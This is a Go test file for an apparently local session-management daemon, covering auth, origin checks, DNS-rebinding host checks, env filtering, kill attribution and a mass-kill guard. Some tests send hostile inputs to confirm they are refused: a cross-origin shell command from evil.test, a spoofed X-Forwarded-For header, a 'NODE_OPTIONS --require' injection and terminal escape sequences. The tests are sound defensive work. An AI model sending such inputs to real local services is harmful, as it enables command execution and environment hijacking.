		t.Errorf("GET wait on missing session status=%d body=%s", found.Code, found.Body.String())
	}
}

type tagsFailureRegistry struct {
	sessionService
	err error
}

func (r *tagsFailureRegistry) Tags(string) (map[string]string, error) { return nil, r.err }

// TestSessionTagsReadSeparatesMissingSessionFromReadFailure pins GET /tags to
// the same distinction its own PUT already made. Reporting an unreadable tag
// file as 404 told an agent its session was gone.
func TestSessionTagsReadSeparatesMissingSessionFromReadFailure(t *testing.T) {
	daemon := newTestDaemon(t)
	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/bash", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	daemon.handler.registry = &tagsFailureRegistry{
		sessionService: daemon.registry,
		err:            errors.New("read session tags: permission denied"),
	}
	unreadable := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/tags", nil, "127.0.0.1:1", nil)
	if unreadable.Code != http.StatusInternalServerError ||
		!strings.Contains(unreadable.Body.String(), "permission denied") {
		t.Fatalf("unreadable tags status=%d body=%s", unreadable.Code, unreadable.Body.String())
	}

	daemon.handler.registry = &tagsFailureRegistry{
		sessionService: daemon.registry,
		err:            fmt.Errorf("%w: session %s", state.ErrSessionNotFound, "missing"),
	}
	gone := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/tags", nil, "127.0.0.1:1", nil)
	if gone.Code != http.StatusNotFound {
		t.Fatalf("missing session tags status=%d body=%s", gone.Code, gone.Body.String())
	}
}

func TestAuthAndOriginMatrix(t *testing.T) {
	daemon := newTestDaemon(t)
	external := "198.51.100.25:5555"

	tests := []struct {
		name       string
		remote     string
		target     string
		headers    http.Header
		wantStatus int
		wantOrigin string
	}{
		{name: "no token", remote: external, target: "/api/sessions", wantStatus: http.StatusUnauthorized},
		{name: "bearer token", remote: external, target: "/api/sessions", headers: http.Header{"Authorization": {"Bearer " + testToken}}, wantStatus: http.StatusOK},
		{name: "query token", remote: external, target: "/api/sessions?token=" + testToken, wantStatus: http.StatusOK},
		{name: "loopback exempt", remote: "127.0.0.1:4567", target: "/api/sessions", wantStatus: http.StatusOK},
		{name: "xff defeats exemption", remote: "127.0.0.1:4567", target: "/api/sessions", headers: http.Header{"X-Forwarded-For": {"127.0.0.1"}}, wantStatus: http.StatusUnauthorized},
		{name: "evil origin response unreadable", remote: external, target: "/api/sessions?token=" + testToken, headers: http.Header{"Origin": {"https://evil.test"}}, wantStatus: http.StatusOK},
		{name: "hosted tech allowed", remote: external, target: "/api/sessions?token=" + testToken, headers: http.Header{"Origin": {"https://sessions.somewhere.tech"}}, wantStatus: http.StatusOK, wantOrigin: "https://sessions.somewhere.tech"},
		{name: "hosted canonical origin allowed", remote: external, target: "/api/sessions?token=" + testToken, headers: http.Header{"Origin": {"https://sessions.somewhere.site"}}, wantStatus: http.StatusOK, wantOrigin: "https://sessions.somewhere.site"},
	}

	t.Run("hostile browser cannot create a loopback session", func(t *testing.T) {
		before := len(daemon.registry.List(true))
		body := strings.NewReader(`{"cmd":"/bin/sh","args":["-c","touch /tmp/sessions-origin-bypass"]}`)
		response := serve(t, daemon.handler, http.MethodPost, "/api/sessions", body, "127.0.0.1:4567", http.Header{
			"Origin":       {"https://evil.test"},
			"Content-Type": {"text/plain"},
		})
		if response.Code != http.StatusForbidden {
			t.Fatalf("status = %d, want %d; body=%s", response.Code, http.StatusForbidden, response.Body.String())
		}
		if after := len(daemon.registry.List(true)); after != before {
			t.Fatalf("hostile origin changed session count from %d to %d", before, after)
		}
	})

	t.Run("bogus bearer cannot bypass the loopback origin guard", func(t *testing.T) {
		before := len(daemon.registry.List(true))
		response := serve(t, daemon.handler, http.MethodPost, "/api/sessions",
			strings.NewReader(`{"cmd":"/bin/sh"}`), "127.0.0.1:4567",
			http.Header{
				"Authorization": {"Bearer not-a-token"},
				"Content-Type":  {"application/json"},
				"Origin":        {"https://evil.test"},
			})
		if response.Code != http.StatusForbidden {
			t.Fatalf("status = %d, want %d; body=%s", response.Code, http.StatusForbidden, response.Body.String())
		}
		if after := len(daemon.registry.List(true)); after != before {
			t.Fatalf("bogus bearer changed session count from %d to %d", before, after)
		}
	})

	t.Run("native JSON endpoints reject simple browser content types", func(t *testing.T) {
		before := len(daemon.registry.List(true))
		response := serve(t, daemon.handler, http.MethodPost, "/api/sessions",
			strings.NewReader(`{"cmd":"/bin/sh"}`), "127.0.0.1:4567",
			http.Header{"Content-Type": {"text/plain"}})
		if response.Code != http.StatusBadRequest ||
			!strings.Contains(response.Body.String(), "content-type must be application/json") {
			t.Fatalf("status = %d body=%s", response.Code, response.Body.String())
		}
		if after := len(daemon.registry.List(true)); after != before {
			t.Fatalf("wrong content type changed session count from %d to %d", before, after)
		}
	})
	t.Run("credential-bearing remote write remains available", func(t *testing.T) {
		before := len(daemon.registry.List(true))
		response := serve(t, daemon.handler, http.MethodPost, "/api/sessions",
			strings.NewReader(`{"cmd":"/bin/sh"}`), external,
			http.Header{
				"Authorization": {"Bearer " + testToken},
				"Content-Type":  {"application/json"},
				"Origin":        {"https://client.example"},
			})
		if response.Code != http.StatusCreated {
			t.Fatalf("status = %d, want %d; body=%s", response.Code, http.StatusCreated, response.Body.String())
		}
		if after := len(daemon.registry.List(true)); after != before+1 {
			t.Fatalf("credential-bearing write changed session count from %d to %d", before, after)
		}
	})
	t.Run("arbitrary localhost port has no ambient write authority", func(t *testing.T) {
		before := len(daemon.registry.List(true))
		response := serve(t, daemon.handler, http.MethodPost, "/api/sessions",
			strings.NewReader(`{"cmd":"/bin/sh"}`), "127.0.0.1:4567",
			http.Header{
				"Content-Type": {"application/json"},
				"Origin":       {"http://localhost:3000"},
			})
		if response.Code != http.StatusForbidden {
			t.Fatalf("status = %d, want %d; body=%s", response.Code, http.StatusForbidden, response.Body.String())
		}
		if after := len(daemon.registry.List(true)); after != before {
			t.Fatalf("untrusted localhost origin changed session count from %d to %d", before, after)
		}
	})
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			response := serve(t, daemon.handler, http.MethodGet, test.target, nil, test.remote, test.headers)
			if response.Code != test.wantStatus {
				t.Fatalf("status = %d, want %d; body=%s", response.Code, test.wantStatus, response.Body.String())
			}
			if got := response.Header().Get("Access-Control-Allow-Origin"); got != test.wantOrigin {
				t.Fatalf("ACAO = %q, want %q", got, test.wantOrigin)
			}
			if vary := response.Header().Get("Vary"); vary != "Origin" {
				t.Fatalf("Vary = %q, want Origin", vary)
			}
		})
	}

	t.Run("open escape hatch", func(t *testing.T) {
		if err := os.WriteFile(daemon.config.OpenPath, nil, 0o600); err != nil {
			t.Fatal(err)
		}
		opened := serve(t, daemon.handler, http.MethodGet, "/api/sessions", nil, external, nil)
		if opened.Code != http.StatusOK {
			t.Fatalf("open escape hatch status = %d, body=%s", opened.Code, opened.Body.String())
		}
		openHealth := serve(t, daemon.handler, http.MethodGet, "/api/health", nil, external, nil)
		var openBody map[string]any
		decodeBody(t, openHealth, &openBody)
		if openBody["access"].(map[string]any)["open"] != true {
			t.Fatalf("health did not expose open access state: %#v", openBody["access"])
		}
	})
}

func TestTrustedAmbientWriteOrigin(t *testing.T) {
	tests := []struct {
		name   string
		origin string
		want   bool
	}{
		{name: "macOS Tauri", origin: "tauri://localhost", want: true},
		{name: "Windows Tauri", origin: "http://tauri.localhost", want: true},
		{name: "checked in dev server", origin: "http://localhost:5273", want: true},
		{name: "daemon same origin", origin: "http://localhost:8787", want: true},
		{name: "daemon IPv6 same origin", origin: "http://[::1]:8787", want: true},
		{name: "LAN daemon same origin", origin: "http://mini.tail.test:8787", want: true},
		{name: "arbitrary local port", origin: "http://localhost:3000", want: false},
		{name: "hosted client needs credential", origin: "https://sessions.somewhere.tech", want: false},
		{name: "untrusted site", origin: "https://evil.test", want: false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := trustedAmbientWriteOrigin(test.origin, "127.0.0.1", 8787, "mini.tail.test"); got != test.want {
				t.Fatalf("trustedAmbientWriteOrigin(%q) = %v, want %v", test.origin, got, test.want)
			}
		})
	}
}

func TestTrustedRequestHost(t *testing.T) {
	tests := []struct {
		name string
		host string
		want bool
	}{
		{name: "loopback", host: "127.0.0.1:8787", want: true},
		{name: "localhost", host: "localhost:8787", want: true},
		{name: "IPv6 loopback", host: "[::1]:8787", want: true},
		{name: "LAN listener", host: "192.0.2.8:8787", want: true},
		{name: "wrong port", host: "127.0.0.1:3000", want: false},
		{name: "DNS rebinding hostname", host: "evil.example:8787", want: false},
		{name: "missing port", host: "127.0.0.1", want: false},
		{name: "malformed IPv6", host: "::1:8787", want: false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := trustedRequestHost(test.host, "127.0.0.1", 8787, "192.0.2.8"); got != test.want {
				t.Fatalf("trustedRequestHost(%q) = %v, want %v", test.host, got, test.want)
			}
		})
	}
}

func TestTokenCreationAndJSONBodyLimit(t *testing.T) {
	daemon := newTestDaemon(t)
	if err := os.Remove(daemon.config.TokenPath); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(daemon.config.OpenPath, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	daemon.handler = New(daemon.config, daemon.registry)
	encoded, err := os.ReadFile(daemon.config.TokenPath)
	if err != nil {
		t.Fatal(err)
	}
	if !validToken(string(encoded)) {
		t.Fatalf("eagerly generated token is not 64 lowercase hex characters: %q", encoded)
	}
	assertMode(t, daemon.config.TokenPath, 0o600)
	if err := os.Chmod(daemon.config.TokenPath, 0o644); err != nil {
		t.Fatal(err)
	}
	daemon.handler = New(daemon.config, daemon.registry)
	assertMode(t, daemon.config.TokenPath, 0o600)
	if err := os.Remove(daemon.config.OpenPath); err != nil {
		t.Fatal(err)
	}
	unauthorized := serve(t, daemon.handler, http.MethodGet, "/api/sessions", nil, "198.51.100.25:5555", nil)
	if unauthorized.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d, body=%s", unauthorized.Code, unauthorized.Body.String())
	}
	encoded, err = os.ReadFile(daemon.config.TokenPath)
	if err != nil {
		t.Fatal(err)
	}
	if !validToken(string(encoded)) {
		t.Fatalf("generated token is not 64 lowercase hex characters: %q", encoded)
	}
	assertMode(t, daemon.config.TokenPath, 0o600)

	tooLarge := strings.NewReader(`{"data":"` + strings.Repeat("x", maxJSONBody) + `"}`)
	response := serve(t, daemon.handler, http.MethodPost, "/api/sessions/missing/input", tooLarge, "127.0.0.1:1", nil)
	if response.Code != http.StatusBadRequest || !strings.Contains(response.Body.String(), "request body too large") {
		t.Fatalf("oversized JSON: status=%d body=%s", response.Code, response.Body.String())
	}
}

func TestCaptureEndRequestAttributesSessionAndReason(t *testing.T) {
	request := httptest.NewRequest(http.MethodDelete, "/api/sessions/landing-page", strings.NewReader(`{}`))
	request = request.WithContext(context.WithValue(request.Context(), authPrincipalContextKey{}, authPrincipal{
		Local: true, Kind: ledger.CreatorUser, ID: "uid:501", Name: "Local user",
	}))
	request.Header.Set(creatorSessionHeader, "00000000-0000-4000-8000-000000000123")
	request.Header.Set(endClientHeader, "sessions-cli")
	end, err := captureEndRequest(request, "Kill completed lanes", "batch-123")
	if err != nil {
		t.Fatal(err)
	}
	if end.InitiatorKind != "session" || end.InitiatorID != "00000000-0000-4000-8000-000000000123" ||
		end.Client != "sessions-cli" || end.Reason != "Kill completed lanes" || end.OperationID != "batch-123" {
		t.Fatalf("end request = %#v", end)
	}
}

func TestCaptureEndRequestRejectsAmbiguousOrMultilineAttribution(t *testing.T) {
	request := httptest.NewRequest(http.MethodDelete, "/api/sessions/landing-page", strings.NewReader(`{}`))
	request = request.WithContext(context.WithValue(request.Context(), authPrincipalContextKey{}, authPrincipal{
		Local: true, Kind: ledger.CreatorUser, ID: "uid:501", Name: "Local user",
	}))
	request.Header.Set(creatorSessionHeader, "00000000-0000-4000-8000-000000000123")
	request.Header.Set(creatorOwnerHeader, "outside-agent")
	if _, err := captureEndRequest(request, "", ""); err == nil {
		t.Fatal("combined session and owner attribution was accepted")
	}
	request.Header.Del(creatorOwnerHeader)
	if _, err := captureEndRequest(request, "first line\nsecond line", ""); err == nil {
		t.Fatal("multiline reason was accepted")
	}
	if _, err := captureEndRequest(request, "terminal \x1b[31mcontrol", ""); err == nil {
		t.Fatal("terminal control sequence was accepted")
	}
}

func TestCaptureEndRequestBindsRemoteDeviceInsteadOfClaimedSession(t *testing.T) {
	request := httptest.NewRequest(http.MethodDelete, "/api/sessions/landing-page", strings.NewReader(`{}`))
	request = request.WithContext(context.WithValue(request.Context(), authPrincipalContextKey{}, authPrincipal{
		Kind: ledger.CreatorExternal, ID: "device:abc123", Name: "Uzair's phone",
	}))
	request.Header.Set(creatorSessionHeader, "00000000-0000-4000-8000-000000000123")
	request.Header.Set(endClientHeader, "sessions-android")
	end, err := captureEndRequest(request, "Stopped from Fleet", "")
	if err != nil {
		t.Fatal(err)
	}
	if end.InitiatorKind != string(ledger.CreatorExternal) || end.InitiatorID != "device:abc123" ||
		end.InitiatorName != "Uzair's phone" || end.Client != "sessions-android" {
		t.Fatalf("remote end principal = %#v", end)
	}
}

func TestBatchEndAppliesAggregateMassKillGuardBeforeAnyTombstone(t *testing.T) {
	daemon := newTestDaemon(t)
	store, err := ledger.Open(context.Background(), ledger.Options{
		Path: filepath.Join(daemon.root, "ledger", "lanes.sqlite3"),
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = store.Close() })
	manager := sessionruntime.NewManager(daemon.config, daemon.launcher, sessionruntime.ManagerOptions{
		MassKillLimit: 3, DisableWatchers: true, ActivityInterval: time.Hour,
		Boundaries: store.Boundaries(), Observations: store.Observations(), LedgerReader: store,
	})
	t.Cleanup(manager.Close)
	daemon.handler = New(daemon.config, manager)

	ids := make([]string, 0, 4)
	for range 4 {
		created, createErr := manager.Create(context.Background(), state.CreateSessionRequest{
			Cmd: "/bin/sh", Cwd: daemon.root,
		})
		if createErr != nil {
			t.Fatal(createErr)
		}
		ids = append(ids, created.ID)
	}
	encodedIDs, err := json.Marshal(ids)
	if err != nil {
		t.Fatal(err)
	}
	refusedBody := strings.NewReader(`{"ids":` + string(encodedIDs) + `,"reason":"cleanup","operationId":"batch-guard"}`)
	refused := serve(t, daemon.handler, http.MethodPost, "/api/sessions/end-batch", refusedBody, "127.0.0.1:1", nil)
	if refused.Code != http.StatusConflict || !strings.Contains(refused.Body.String(), "mass-kill guard refused") {
		t.Fatalf("guard response=%d body=%s", refused.Code, refused.Body.String())
	}
	for _, id := range ids {
		events, readErr := store.Events(context.Background(), id)
		if readErr != nil {
			t.Fatal(readErr)
		}
		for _, event := range events {
			if event.Type == ledger.EventUserKillRequested {
				t.Fatalf("guard-refused session %s received a tombstone", id)
			}
		}
	}

	forcedBody := strings.NewReader(`{"ids":` + string(encodedIDs) + `,"reason":"cleanup","operationId":"batch-force","force":true}`)
	forced := serve(t, daemon.handler, http.MethodPost, "/api/sessions/end-batch", forcedBody, "127.0.0.1:1", nil)
	if forced.Code != http.StatusOK {
		t.Fatalf("forced response=%d body=%s", forced.Code, forced.Body.String())
	}
	for _, id := range ids {
		events, readErr := store.Events(context.Background(), id)
		if readErr != nil {
			t.Fatal(readErr)
		}
		folded := ledger.Fold(events)
		if len(folded) != 1 || !folded[0].UserKillRequested || folded[0].EndOperationID != "batch-force" {
			t.Fatalf("forced session %s lifecycle=%#v", id, folded)
		}
	}
}

func TestDeleteExitedShellIsIdempotentWithoutUserKillBoundary(t *testing.T) {
	daemon := newTestDaemon(t)
	store, err := ledger.Open(context.Background(), ledger.Options{
		Path: filepath.Join(daemon.root, "ledger", "lanes.sqlite3"),
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = store.Close() })
	manager := sessionruntime.NewManager(daemon.config, daemon.launcher, sessionruntime.ManagerOptions{
		DisableWatchers: true, ActivityInterval: time.Hour,
		Boundaries: store.Boundaries(), Observations: store.Observations(), LedgerReader: store,
	})
	t.Cleanup(manager.Close)
	daemon.handler = New(daemon.config, manager)

	created, err := manager.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/sh", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	runner := daemon.launcher.Runner(created.ID)
	if runner == nil {
		t.Fatal("created shell has no runner")
	}
	if err := runner.Kill(context.Background()); err != nil {
		t.Fatal(err)
	}

	response := serve(
		t, daemon.handler, http.MethodDelete, "/api/sessions/"+created.ID,
		strings.NewReader(`{}`), "127.0.0.1:1", nil,
	)
	if response.Code != http.StatusOK || !strings.Contains(response.Body.String(), `"ok":true`) {
		t.Fatalf("end exited shell status=%d body=%s", response.Code, response.Body.String())
	}
	events, err := store.Events(context.Background(), created.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, event := range events {
		if event.Type == ledger.EventUserKillRequested {
			t.Fatalf("idempotent end appended a user-kill boundary after shell exit: %#v", events)
		}
	}
}

func TestDeleteKnownSessionReturnsConflictForUnverifiableInitiator(t *testing.T) {
	daemon := newTestDaemon(t)
	store, err := ledger.Open(context.Background(), ledger.Options{
		Path: filepath.Join(daemon.root, "ledger", "lanes.sqlite3"),
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = store.Close() })
	manager := sessionruntime.NewManager(daemon.config, daemon.launcher, sessionruntime.ManagerOptions{
		DisableWatchers: true, ActivityInterval: time.Hour,
		Boundaries: store.Boundaries(), Observations: store.Observations(), LedgerReader: store,
	})
	t.Cleanup(manager.Close)
	daemon.handler = New(daemon.config, manager)

	created, err := manager.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "/bin/sh", Cwd: daemon.root,
	})
	if err != nil {
		t.Fatal(err)
	}
	response := serve(
		t, daemon.handler, http.MethodDelete, "/api/sessions/"+created.ID,
		strings.NewReader(`{}`), "127.0.0.1:1", http.Header{
			creatorSessionHeader: {"11111111-1111-4111-8111-111111111111"},
		},
	)
	if response.Code != http.StatusConflict ||
		!strings.Contains(response.Body.String(), "could not safely end session") ||
		!strings.Contains(response.Body.String(), "before retrying") {
		t.Fatalf("unverifiable initiator status=%d body=%s", response.Code, response.Body.String())
	}
	shell, ok := manager.Get(created.ID)
	if !ok {
		t.Fatal("conflict removed the target session")
	}
	if info := shell.Info(); info.Exited {
		t.Fatalf("conflict ended the target session: info=%#v", info)
	}
	events, err := store.Events(context.Background(), created.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, event := range events {
		if event.Type == ledger.EventUserKillRequested {
			t.Fatalf("rejected attribution appended a user-kill boundary: %#v", events)
		}
	}
}

func TestSessionsLifecycleAndRouteShapes(t *testing.T) {
	daemon := newTestDaemon(t)

	list := serve(t, daemon.handler, http.MethodGet, "/api/sessions", nil, "127.0.0.1:1", nil)
	var listed struct {
		Sessions []state.SessionInfo `json:"sessions"`
	}
	decodeBody(t, list, &listed)
	if len(listed.Sessions) != 0 {
		t.Fatalf("initial sessions = %#v, want empty", listed.Sessions)
	}

	createBody := map[string]any{
		"cmd": "/bin/sh", "args": []string{"-l"}, "cwd": daemon.root,
		"cols": 120, "rows": 40, "name": "acceptance fake",
		"tags": map[string]string{"Product.Line": " Sessions "},
		"env":  map[string]string{"SAFE_VALUE": "yes", "RUNNER_ID": "evil", "NODE_OPTIONS": "--require bad"},
	}
	encoded, _ := json.Marshal(createBody)
	created := serve(t, daemon.handler, http.MethodPost, "/api/sessions", bytes.NewReader(encoded), "127.0.0.1:1", http.Header{"Content-Type": {"application/json"}})
	if created.Code != http.StatusCreated {
		t.Fatalf("create status = %d, body=%s", created.Code, created.Body.String())
	}
	var info state.SessionInfo
	decodeBody(t, created, &info)
	if info.ID == "" || info.Name != "acceptance fake" || info.Tags["product.line"] != "Sessions" || info.Tool != state.ToolTerminal || info.PID != daemon.launcher.PID {
		t.Fatalf("unexpected create response: %#v", info)
	}

	metadataPath := filepath.Join(daemon.config.RunnerStateDir, info.ID+".json")
	metadata, err := os.ReadFile(metadataPath)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"id": "` + info.ID + `"`, `"name": "acceptance fake"`, `"product.line": "Sessions"`, `"cmd": "/bin/sh"`, `"sockPath"`} {
		if !bytes.Contains(metadata, []byte(want)) {
			t.Errorf("metadata missing %q: %s", want, metadata)
		}
	}
	assertMode(t, metadataPath, 0o600)
	plistPath := filepath.Join(daemon.config.LaunchAgentsDir, "tech.somewhere.sessions.runner."+info.ID+".plist")
	plist, err := os.ReadFile(plistPath)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"tech.somewhere.sessions.runner." + info.ID, "<string>Interactive</string>", "<key>RUNNER_ID</key>"} {
		if !bytes.Contains(plist, []byte(want)) {
			t.Errorf("plist missing %q", want)
		}
	}
	if bytes.Contains(plist, []byte("NODE_OPTIONS")) || bytes.Contains(plist, []byte("<string>evil</string>")) {
		t.Fatalf("unsafe caller environment leaked into plist: %s", plist)
	}
	assertMode(t, plistPath, 0o600)

	list = serve(t, daemon.handler, http.MethodGet, "/api/sessions", nil, "127.0.0.1:1", nil)
	decodeBody(t, list, &listed)
	if len(listed.Sessions) != 1 || listed.Sessions[0].ID != info.ID || listed.Sessions[0].Name != "acceptance fake" {
		t.Fatalf("sessions after create = %#v", listed.Sessions)
	}

	tags := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/tags", nil, "127.0.0.1:1", nil)
	if tags.Code != http.StatusOK || !strings.Contains(tags.Body.String(), `"product.line":"Sessions"`) {
		t.Fatalf("get tags: status=%d body=%s", tags.Code, tags.Body.String())
	}
	updatedTags := serve(t, daemon.handler, http.MethodPut, "/api/sessions/"+info.ID+"/tags", strings.NewReader(`{"tags":{"Team":" native "}}`), "127.0.0.1:1", nil)
	if updatedTags.Code != http.StatusOK || !strings.Contains(updatedTags.Body.String(), `"team":"native"`) {
		t.Fatalf("put tags: status=%d body=%s", updatedTags.Code, updatedTags.Body.String())
	}
	invalidTags := serve(t, daemon.handler, http.MethodPut, "/api/sessions/"+info.ID+"/tags", strings.NewReader(`{"tags":{"bad key":"value"}}`), "127.0.0.1:1", nil)
	if invalidTags.Code != http.StatusBadRequest {
		t.Fatalf("invalid tags: status=%d body=%s", invalidTags.Code, invalidTags.Body.String())
	}
	renamed := serve(t, daemon.handler, http.MethodPut, "/api/sessions/"+info.ID+"/name", strings.NewReader(`{"name":"  DB  "}`), "127.0.0.1:1", nil)
	if renamed.Code != http.StatusOK || !strings.Contains(renamed.Body.String(), `"name":"DB"`) {
		t.Fatalf("rename: status=%d body=%s", renamed.Code, renamed.Body.String())
	}
	list = serve(t, daemon.handler, http.MethodGet, "/api/sessions", nil, "127.0.0.1:1", nil)
	decodeBody(t, list, &listed)
	if len(listed.Sessions) != 1 || listed.Sessions[0].Name != "DB" {
		t.Fatalf("sessions after rename = %#v", listed.Sessions)
	}
	renamedMetadata, err := state.ReadRunnerMetadata(metadataPath)
	if err != nil || renamedMetadata.Name != "DB" {
		t.Fatalf("persisted rename = %#v, err=%v", renamedMetadata, err)
	}

	runner := daemon.launcher.Runner(info.ID)
	session, ok := daemon.registry.Get(info.ID)
	if !ok {
		t.Fatal("created session was not registered")
	}
	attachment := session.Attach(state.AttachOptions{})
	defer attachment.Cancel()
	runner.AddOutput("hello from fake runner\n")
	runner.AddClaudeEvent(map[string]any{"type": "user", "n": 1})
	runner.AddClaudeEvent(map[string]any{"type": "assistant", "n": 2})
	runner.AddClaudeEvent(map[string]any{"type": "assistant", "n": 3})
	for _, want := range []proto.EventKind{proto.EventOutput, proto.EventClaude, proto.EventClaude, proto.EventClaude} {
		if event := <-attachment.Events; event.Kind != want {
			t.Fatalf("session event kind = %v, want %v", event.Kind, want)
		}
	}
	if session.Replay(0).Current != 1 || session.ClaudeEventCount() != 3 {
		t.Fatalf("session did not retain output and Claude events")
	}

	snapshot := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/snapshot?cols=80", nil, "127.0.0.1:1", nil)
	wantSnapshot := "hello from fake runner" + strings.Repeat(" ", 80-len("hello from fake runner"))
	if snapshot.Code != http.StatusOK || snapshot.Header().Get("X-Sessions-Seq") != "1" || snapshot.Body.String() != wantSnapshot {
		t.Fatalf("snapshot status=%d seq=%q body=%q", snapshot.Code, snapshot.Header().Get("X-Sessions-Seq"), snapshot.Body.String())
	}

	events := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/events?tail=2", nil, "127.0.0.1:1", nil)
	var eventBody struct {
		Events     []map[string]any `json:"events"`
		NextIndex  int64            `json:"nextIndex"`
		StartIndex int64            `json:"startIndex"`
		EndIndex   int64            `json:"endIndex"`
	}
	decodeBody(t, events, &eventBody)
	if len(eventBody.Events) != 2 || eventBody.NextIndex != 3 || eventBody.StartIndex != 1 || eventBody.EndIndex != 3 {
		t.Fatalf("unexpected events tail: %#v", eventBody)
	}

	input := serve(t, daemon.handler, http.MethodPost, "/api/sessions/"+info.ID+"/input", strings.NewReader(`{"data":"pwd\n"}`), "127.0.0.1:1", nil)
	if input.Code != http.StatusOK {
		t.Fatalf("input status=%d body=%s", input.Code, input.Body.String())
	}
	if got := runner.Inputs(); len(got) != 1 || got[0] != "pwd\n" {
		t.Fatalf("runner inputs = %#v", got)
	}

	killed := serve(t, daemon.handler, http.MethodDelete, "/api/sessions/"+info.ID, nil, "127.0.0.1:1", nil)
	if killed.Code != http.StatusOK {
		t.Fatalf("kill status=%d body=%s", killed.Code, killed.Body.String())
	}
	if event := <-attachment.Events; event.Kind != proto.EventExit {
		t.Fatalf("terminal event kind = %v, want exit", event.Kind)
	}
	if active := daemon.registry.List(false); len(active) != 0 {
		t.Fatalf("active sessions after exit = %#v", active)
	}
	if sessions := daemon.registry.List(true); len(sessions) != 1 || !sessions[0].Exited || sessions[0].ExitCode == nil || *sessions[0].ExitCode != 0 {
		t.Fatalf("include-exited sessions = %#v", sessions)
	}
}

func TestRichSessionModelControlAppliesToNextTurn(t *testing.T) {
	daemon := newTestDaemon(t)
	manager := sessionruntime.NewManager(daemon.config, daemon.launcher, sessionruntime.ManagerOptions{
		DisableWatchers:  true,
		ActivityInterval: time.Hour,
		ListCodexModels: func(context.Context, string) ([]codexapp.Model, error) {
			return []codexapp.Model{{
				ID: "gpt-next", Model: "gpt-next", IsDefault: true,
				SupportedReasoningEfforts: []codexapp.ReasoningEffortOption{{ReasoningEffort: "high"}},
			}}, nil
		},
	})
	t.Cleanup(manager.Close)
	daemon.handler = New(daemon.config, manager)

	newSessionOptions := serve(
		t,
		daemon.handler,
		http.MethodGet,
		"/api/models/codex",
		nil,
		"127.0.0.1:1",
		nil,
	)
	if newSessionOptions.Code != http.StatusOK || !strings.Contains(newSessionOptions.Body.String(), `"id":"gpt-next"`) {
		t.Fatalf("new-session model options status=%d body=%s", newSessionOptions.Code, newSessionOptions.Body.String())
	}

	created, err := manager.Create(context.Background(), state.CreateSessionRequest{
		Cmd: "codex", Cwd: daemon.root, Kind: state.KindCodexAppServer,
	})
	if err != nil {
		t.Fatal(err)
	}

	options := serve(
		t,
		daemon.handler,
		http.MethodGet,
		"/api/sessions/"+created.ID+"/model-options",
		nil,
		"127.0.0.1:1",
		nil,
	)
	if options.Code != http.StatusOK || !strings.Contains(options.Body.String(), `"id":"gpt-next"`) {
		t.Fatalf("model options status=%d body=%s", options.Code, options.Body.String())
	}

	updated := serve(
		t,
		daemon.handler,
		http.MethodPut,
		"/api/sessions/"+created.ID+"/model",
		strings.NewReader(`{"model":"gpt-next","effort":"high"}`),
		"127.0.0.1:1",
		nil,
	)
	if updated.Code != http.StatusOK {
		t.Fatalf("model update status=%d body=%s", updated.Code, updated.Body.String())
	}
	var info state.SessionInfo
	decodeBody(t, updated, &info)
	if info.Model != "gpt-next" || info.Effort != "high" {
		t.Fatalf("updated model = %#v", info)
	}
	controls := daemon.launcher.Runner(created.ID).ModelControls()
	if len(controls) != 1 || controls[0].Model != "gpt-next" || controls[0].Effort != "high" {
		t.Fatalf("runner controls = %#v", controls)
	}
}

func TestWebSocketSingleMuxAndHandshakePolicy(t *testing.T) {
	daemon := newTestDaemon(t)
	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{Cmd: "/bin/sh", Cwd: daemon.root})
	if err != nil {
		t.Fatal(err)
	}
	runner := daemon.launcher.Runner(info.ID)
	httpServer := httptest.NewServer(daemon.handler)
	defer httpServer.Close()
	wsBase := "ws" + strings.TrimPrefix(httpServer.URL, "http")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	connection, _, err := websocket.Dial(ctx, wsBase+"/ws?sessionId="+url.QueryEscape(info.ID), nil)
	if err != nil {
		t.Fatal(err)
	}
	message := readWS(t, ctx, connection)
	if message["type"] != "hello" || message["protocol"] != float64(2) {
		t.Fatalf("single hello = %#v", message)
	}
	runner.AddOutput("live-output")
	message = readWS(t, ctx, connection)
	if message["type"] != "output" || message["data"] != "live-output" {
		t.Fatalf("single output = %#v", message)
	}
	writeWS(t, ctx, connection, map[string]any{"type": "ping"})
	if message = readWS(t, ctx, connection); message["type"] != "pong" {
		t.Fatalf("single pong = %#v", message)
	}
	writeWS(t, ctx, connection, map[string]any{"type": "input", "data": "whoami\n"})
	writeWS(t, ctx, connection, map[string]any{"type": "resize", "cols": 1, "rows": 999})
	awaitRunnerChange(t, runner, func() bool {
		cols, rows := runner.Size()
		return cols == 40 && rows == 200 && len(runner.Inputs()) > 0
	})
	_ = connection.Close(websocket.StatusNormalClosure, "done")

	mux, _, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", nil)
	if err != nil {
		t.Fatal(err)
	}
	defer mux.CloseNow()
	falseValue := false
	writeWS(t, ctx, mux, map[string]any{"type": "attach", "sessionId": info.ID, "outputReplay": falseValue})
